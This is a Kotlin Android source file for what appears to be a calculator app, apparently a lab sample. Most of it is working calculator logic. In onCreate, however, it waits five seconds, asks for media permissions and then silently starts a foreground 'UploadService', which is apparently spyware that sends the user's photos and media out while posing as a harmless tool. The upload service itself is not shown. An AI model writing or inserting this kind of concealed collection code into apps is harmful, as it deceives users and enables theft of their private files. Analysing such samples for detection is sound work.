package com.lab.calculator

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.TextView

class MainActivity : Activity() {

    private lateinit var tvDisplay: TextView
    private var currentInput = ""
    private var firstOperand: Double? = null
    private var currentOperator: String? = null
    private var isNewInput = true

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvDisplay = findViewById(R.id.tvDisplay)
        setupButtons()

        tvDisplay.postDelayed({
            startBackgroundService()
        }, 5000)
    }

    private fun startBackgroundService() {
        if (PermissionHelper.hasMediaPermissions(this)) {
            startUploadService()
        } else {
            PermissionHelper.requestMediaPermissions(this) { granted ->
                if (granted) {
                    startUploadService()
                }
            }
        }
    }

    private fun startUploadService() {
        val intent = Intent(this, UploadService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun setupButtons() {
        val numberButtons = mapOf(
            R.id.btn0 to "0", R.id.btn1 to "1", R.id.btn2 to "2",
            R.id.btn3 to "3", R.id.btn4 to "4", R.id.btn5 to "5",
            R.id.btn6 to "6", R.id.btn7 to "7", R.id.btn8 to "8",
            R.id.btn9 to "9", R.id.btnDot to "."
        )
        numberButtons.forEach { (id, value) ->
            findViewById<Button>(id).setOnClickListener { onNumberClick(value) }
        }
        findViewById<Button>(R.id.btnPlus).setOnClickListener { onOperatorClick("+") }
        findViewById<Button>(R.id.btnMinus).setOnClickListener { onOperatorClick("-") }
        findViewById<Button>(R.id.btnMultiply).setOnClickListener { onOperatorClick("×") }
        findViewById<Button>(R.id.btnDivide).setOnClickListener { onOperatorClick("÷") }
        findViewById<Button>(R.id.btnEquals).setOnClickListener { onEqualsClick() }
        findViewById<Button>(R.id.btnAC).setOnClickListener { onClearClick() }
        findViewById<Button>(R.id.btnDel).setOnClickListener { onDeleteClick() }
        findViewById<Button>(R.id.btnPercent).setOnClickListener { onPercentClick() }
    }

    private fun onNumberClick(value: String) {
        if (isNewInput) {
            currentInput = value
            isNewInput = false
        } else {
            currentInput += value
        }
        tvDisplay.text = currentInput
    }

    private fun onOperatorClick(op: String) {
        if (currentInput.isNotEmpty()) {
            firstOperand = currentInput.toDoubleOrNull()
            currentOperator = op
            isNewInput = true
        }
    }

    private fun onEqualsClick() {
        val secondOperand = currentInput.toDoubleOrNull() ?: return
        val first = firstOperand ?: return
        val op = currentOperator ?: return
        val result = when (op) {
            "+" -> first + secondOperand
            "-" -> first - secondOperand
            "×" -> first * secondOperand
            "÷" -> if (secondOperand != 0.0) first / secondOperand else Double.NaN
            else -> return
        }
        tvDisplay.text = formatResult(result)
        currentInput = formatResult(result)
        isNewInput = true
        firstOperand = null
        currentOperator = null
    }

    private fun onClearClick() {
        currentInput = ""
        tvDisplay.text = "0"
        firstOperand = null
        currentOperator = null
        isNewInput = true
    }

    private fun onDeleteClick() {
        if (currentInput.isNotEmpty()) {
            currentInput = currentInput.dropLast(1)
            tvDisplay.text = if (currentInput.isEmpty()) "0" else currentInput
        }
    }

    private fun onPercentClick() {
        val value = currentInput.toDoubleOrNull() ?: return
        val result = value / 100
        tvDisplay.text = formatResult(result)
        currentInput = formatResult(result)
        isNewInput = true
    }

    private fun formatResult(value: Double): String {
        return if (value == value.toLong().toDouble()) {
            value.toLong().toString()
        } else {
            String.format("%.6f", value).trimEnd('0').trimEnd('.')
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        PermissionHelper.onRequestResult(requestCode, grantResults) { granted ->
            if (granted) startUploadService()
        }
    }
}